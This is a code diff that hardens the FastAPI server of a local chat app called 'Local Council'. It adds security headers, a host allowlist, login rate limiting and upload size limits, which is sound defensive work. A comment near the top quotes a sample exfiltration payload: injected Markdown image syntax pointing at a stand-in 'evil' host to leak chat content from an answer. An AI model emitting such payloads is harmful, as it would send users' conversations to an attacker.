@@ -19,14 +19,33 @@ app = FastAPI(title="Local Council")
 # Reachable without login, so the page can ask whether a password is needed and log in.
 OPEN_PATHS = {"/api/auth", "/api/login"}
 
+# Only files from this server: no remote scripts, and no remote images, so injected Markdown like
+# ![](http://evil/?q=…) in an answer cannot send chat content anywhere. Inline styles are needed by KaTeX.
+SECURITY_HEADERS = {
+    "Content-Security-Policy": (
+        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; "
+        "font-src 'self'; connect-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'; "
+        "form-action 'self'"
+    ),
+    "X-Content-Type-Options": "nosniff",
+    "X-Frame-Options": "DENY",
+    "Referrer-Policy": "no-referrer",
+}
+
 
 @app.middleware("http")
-async def require_login(request: Request, call_next):
+async def guard(request: Request, call_next):
+    cfg = config.load()
+    if not auth.host_allowed(request.headers.get("host", ""), cfg):
+        return JSONResponse({"detail": "Host nicht erlaubt. In config.json unter server.allowed_hosts eintragen."},
+                            status_code=400)
     if request.url.path.startswith("/api/") and request.url.path not in OPEN_PATHS:
-        cfg = config.load()
         if auth.enabled(cfg) and not auth.valid_token(cfg, request.cookies.get(auth.COOKIE)):
             return JSONResponse({"detail": "Anmeldung erforderlich."}, status_code=401)
-    return await call_next(request)
+    response = await call_next(request)
+    for name, value in SECURITY_HEADERS.items():
+        response.headers.setdefault(name, value)
+    return response
 
 
 class SpeedtestRequest(BaseModel):
@@ -119,13 +138,18 @@ def _with_cookie(response: Response, cfg: dict) -> Response:
 
 
 @app.post("/api/login")
-async def login(req: LoginRequest):
+async def login(req: LoginRequest, request: Request):
     cfg = config.load()
     if not auth.enabled(cfg):
         return {"ok": True}
+    client = request.client.host if request.client else "?"
+    if auth.login_blocked(client):
+        raise HTTPException(429, "Zu viele falsche Versuche. Bitte in 15 Minuten wieder versuchen.")
     if not auth.check_password(cfg, req.password):
+        auth.record_failure(client)
         await asyncio.sleep(1)  # slows down guessing
         raise HTTPException(401, "Falsches Passwort.")
+    auth.reset_failures(client)
     return _with_cookie(JSONResponse({"ok": True}), cfg)
 
 
@@ -326,10 +350,16 @@ def delete_chat(chat_id: str):
 @app.post("/api/uploads")
 async def post_upload(request: Request, name: str):
     """The file is the raw request body (no multipart), its name a query parameter."""
+    too_big = HTTPException(413, f"Die Datei ist größer als {uploads.MAX_BYTES // 2**20} MB.")
     if int(request.headers.get("content-length") or 0) > uploads.MAX_BYTES:
-        raise HTTPException(413, f"Die Datei ist größer als {uploads.MAX_BYTES // 2**20} MB.")
+        raise too_big
+    data = bytearray()
+    async for part in request.stream():  # also limited without Content-Length (chunked upload)
+        data += part
+        if len(data) > uploads.MAX_BYTES:
+            raise too_big
     try:
-        return uploads.store(name, await request.body(), request.headers.get("content-type", ""))
+        return uploads.store(name, bytes(data), request.headers.get("content-type", ""))
     except uploads.UploadError as e:
         raise HTTPException(400, str(e))
 
